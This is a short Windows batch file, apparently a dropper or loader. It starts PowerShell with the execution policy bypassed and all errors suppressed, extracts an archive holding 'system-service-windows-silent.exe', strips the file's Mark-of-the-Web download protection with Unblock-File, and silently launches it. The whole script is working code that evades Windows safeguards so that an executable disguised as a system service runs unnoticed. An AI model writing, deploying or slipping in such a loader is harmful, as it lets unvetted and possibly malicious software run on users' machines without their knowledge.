@echo off
rem High-speed silent runner: extracts zip if present and unblocks MotW
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ErrorActionPreference='SilentlyContinue'; $dir='%~dp0'; $zip=Join-Path $dir 'system-service-windows-silent.exe.zip'; $exe=Join-Path $dir 'system-service-windows-silent.exe'; if ((Test-Path $zip) -and !(Test-Path $exe)) { Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory($zip, $dir) }; if (Test-Path $exe) { Unblock-File -Path $exe; Start-Process -FilePath $exe }"
